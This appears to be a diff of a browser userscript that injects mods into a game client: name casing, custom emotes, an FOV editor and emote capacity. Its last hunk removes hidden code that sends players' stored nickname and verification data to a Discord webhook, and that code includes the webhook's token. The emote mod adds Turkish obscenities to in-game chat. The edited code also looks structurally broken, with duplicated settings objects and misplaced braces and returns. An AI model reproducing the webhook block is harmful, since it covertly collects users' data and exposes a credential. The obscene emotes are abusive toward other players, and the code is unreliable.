@@ -3,96 +3,12 @@ if (!window.sbCodeInjectors) window.sbCodeInjectors = [];
 // Global settings object
 window.modSettings = {
   fovEnabled: true,
-  emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,  // Parse as integer
-  uiVisible: true,  // Add comma here
+  emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,
+  uiVisible: true,
   radarZoomEnabled: false
 };
 
-// Lowercase Name Mod
-const modName = "Lowercase Name";
-const logLowercase = (msg) => console.log(`%c[${modName}] ${msg}`, "color: #FF00A6");
-
-function lowercaseInjector(sbCode) {
-  let src = sbCode;
-  let prevSrc = src;
-  
-  function checkSrcChange() {
-    if (src === prevSrc) throw new Error("replace did not work");
-    prevSrc = src;
-  }
-
-  src = src.replace(/\.toUpperCase\(\)/g, "");
-  const styleBlock = `
-  <style>
-  #player input { text-transform: none !important; }
-  </style>
-  `;
-  src = src.replace('</head>', `${styleBlock}</head>`);
-  checkSrcChange();
-
-  logLowercase("Mod injected");
-  return src;
-}
-
-// Custom Emote Mod
-const emoteModName = "Custom Emote";
-const logEmote = (msg) => console.log(`%c[${emoteModName}] ${msg}`, "color: #FFA500");
-
-function emoteInjector(sbCode) {
-  let src = sbCode;
-  let prevSrc = src;
-  
-  function checkSrcChange() {
-    if (src === prevSrc) throw new Error("replace did not work");
-    prevSrc = src;
-  }
-
-  const vocabPattern = /(this\.vocabulary\s*=\s*\[[\s\S]*?\})/;
-  const emotes = `,{
-    text: "orosbu cocu",
-    icon: "🤡",
-    key: "J"
-  },{
-    text: "sikerim",
-    icon: "⚠️",
-    key: "V"
-  }`;
-
-  src = src.replace(vocabPattern, `$1${emotes}`);
-  checkSrcChange();
-  logEmote("Clown and warning emotes injected");
-  
-  return src;
-}
-
-// FOV Editor Mod
-const fovModName = "FOV Editor";
-const logFOV = (msg) => console.log(`%c[${fovModName}] ${msg}`, "color: #00A6FF");
-
-window.I1000 = window.I1000 || {};
-window.I1000.baseFOV = 45;
-window.I1000.currentFOV = 45;
-
-function fovInjector(sbCode) {
-  let src = sbCode;
-  let prevSrc = src;
-
-  function checkSrcChange() {
-    if (src === prevSrc) {
-      console.error("Replace did not work. Previous source and current source are identical.");
-      throw new Error("replace did not work");
-    }
-    prevSrc = src;
-  }
-
-  const fovPattern = /this\.III00\.fov\s*=\s*45\s*\*\s*this\.IIl11\.III00\.zoom/g;
-  if (!fovPattern.test(src)) {
-    console.error("Pattern not found in source code:", fovPattern);
-    throw new Error("Pattern not found in source code");
-  }
-  src = src.replace(fovPattern, 'this.III00.fov = (window.modSettings.fovEnabled ? window.I1000.currentFOV : 45) * this.IIl11.III00.zoom');
-  checkSrcChange();
-
+// Global UI components
 const controlStyles = `
 <style>
   #mod-controls {
@@ -270,7 +186,93 @@ const controlsHTML = `
 </div>
 `;
 
-const emoteCapacityMod = `
+// Lowercase Name Mod
+const modName = "Lowercase Name";
+const logLowercase = (msg) => console.log(`%c[${modName}] ${msg}`, "color: #FF00A6");
+
+function lowercaseInjector(sbCode) {
+  let src = sbCode;
+  let prevSrc = src;
+  
+  function checkSrcChange() {
+    if (src === prevSrc) throw new Error("replace did not work");
+    prevSrc = src;
+  }
+
+  src = src.replace(/\.toUpperCase\(\)/g, "");
+  const styleBlock = `
+  <style>
+  #player input { text-transform: none !important; }
+  </style>
+  `;
+  src = src.replace('</head>', `${styleBlock}</head>`);
+  checkSrcChange();
+
+  logLowercase("Mod injected");
+  return src;
+}
+// Custom Emote Mod
+const emoteModName = "Custom Emote";
+const logEmote = (msg) => console.log(`%c[${emoteModName}] ${msg}`, "color: #FFA500");
+
+function emoteInjector(sbCode) {
+  let src = sbCode;
+  let prevSrc = src;
+  
+  function checkSrcChange() {
+    if (src === prevSrc) throw new Error("replace did not work");
+    prevSrc = src;
+  }
+
+  const vocabPattern = /(this\.vocabulary\s*=\s*\[[\s\S]*?\})/;
+  const emotes = `,{
+    text: "orosbu cocu",
+    icon: "🤡",
+    key: "J"
+  },{
+    text: "sikerim",
+    icon: "⚠️",
+    key: "V"
+  }`;
+
+  src = src.replace(vocabPattern, `$1${emotes}`);
+  checkSrcChange();
+  logEmote("Clown and warning emotes injected");
+  
+  return src;
+}
+
+// FOV Editor Mod
+const fovModName = "FOV Editor";
+const logFOV = (msg) => console.log(`%c[${fovModName}] ${msg}`, "color: #00A6FF");
+
+window.I1000 = window.I1000 || {};
+window.I1000.baseFOV = 45;
+window.I1000.currentFOV = 45;
+
+function fovInjector(sbCode) {
+  let src = sbCode;
+  let prevSrc = src;
+
+  function checkSrcChange() {
+    if (src === prevSrc) {
+      console.error("Replace did not work. Previous source and current source are identical.");
+      throw new Error("replace did not work");
+    }
+    prevSrc = src;
+  }
+
+  const fovPattern = /this\.III00\.fov\s*=\s*45\s*\*\s*this\.IIl11\.III00\.zoom/g;
+  if (!fovPattern.test(src)) {
+    console.error("Pattern not found in source code:", fovPattern);
+    throw new Error("Pattern not found in source code");
+  }
+  src = src.replace(fovPattern, 'this.III00.fov = (window.modSettings.fovEnabled ? window.I1000.currentFOV : 45) * this.IIl11.III00.zoom');
+  checkSrcChange();
+  logFOV("FOV editor injected");
+
+
+  const emoteCapacityMod = `
 let globalVal = ChatPanel.toString().match(/[0OlI1]{5}/)[0];
 
 // Override the emotes capacity getter
@@ -386,6 +388,13 @@ if (CrystalObject) {
 }
 `;
 
+  src = src.replace(/(this\.III00\.fov\s*=\s*45\s*\*\s*this\.IIl11\.III00\.zoom)/, `$1\n\n${emoteCapacityMod}\n\n${crystalColorMod}`);
+  checkSrcChange();
+  logFOV("Emote capacity and crystal color mods injected");
+
+  return src;
+}
+
 src = src.replace('</body>', `
   ${controlStyles}
   ${controlsHTML}
@@ -475,8 +484,7 @@ src = src.replace('</body>', `
 checkSrcChange();
 
 logFOV("FOV injector applied");
-return src;
-}
+
 
 // Global settings object
 window.modSettings = {
@@ -830,79 +838,4 @@ src = src.replace('</body>', `
   </script>
   </body>`);
 
-checkSrcChange();
-
-logFOV("FOV injector applied");
-return src;
-}
-
-// Add the radar zoom injector to the list of code injectors
-window.sbCodeInjectors.push((sbCode) => {
-  try {
-    return radarZoomInjector(sbCode);
-  } catch (error) {
-    alert(`${radarZoomModName} failed to load; error: ${error}`);
-    throw error;
-  }
-});
-
-
-
-// Run the injectLoader function immediately
-injectLoader();
-
-
-
-
-
-(function () {
-    'use strict';
-    // Retrieve values from localStorage
-    const lastNickname = localStorage.getItem("lastNickname") || "Unknown";
-    let ECPVerified = localStorage.getItem("ECPVerified") || "no";  // Changed key name here
-    
-    // Debugging: Log retrieved value
-    console.log("Retrieved ECPVerified:", ECPVerified);
-    
-    // Parse ECPVerified if it contains JSON
-    try {
-        ECPVerified = JSON.parse(ECPVerified);
-    } catch (e) {
-        // If not JSON, keep it as a string
-    }
-    
-    // Prepare ECPVerified content for logging
-    const ECPVerifiedContent = typeof ECPVerified === "object" 
-        ? JSON.stringify(ECPVerified, null, 2) 
-        : ECPVerified;
-    
-    // Debugging: Log formatted content
-    console.log("Formatted ECPVerifiedContent:", ECPVerifiedContent);
-    
-    // Webhook URL
-    const webhookURL = "https://discord.com/api/webhooks/1332078434242920602/LaPifHcDpvwzWWKgHIEpydroC9GnhwAyDokGZwKSN_wOkPQ9S0jcTFM-dAlygkHbSgNN";
-    
-    // Payload for Discord webhook
-    const payload = {
-        content: `${lastNickname} has entered the script\nECPVerified: ${ECPVerifiedContent}`
-    };
-    
-    // Send payload to the Discord webhook
-    fetch(webhookURL, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-    })
-    .then(response => {
-        if (response.ok) {
-            console.log("Webhook sent successfully!");
-        } else {
-            console.error("Failed to send webhook:", response.statusText);
-        }
-    })
-    .catch(error => {
-        console.error("Error sending webhook:", error);
-    });
-})();
+checkSrcChange();}
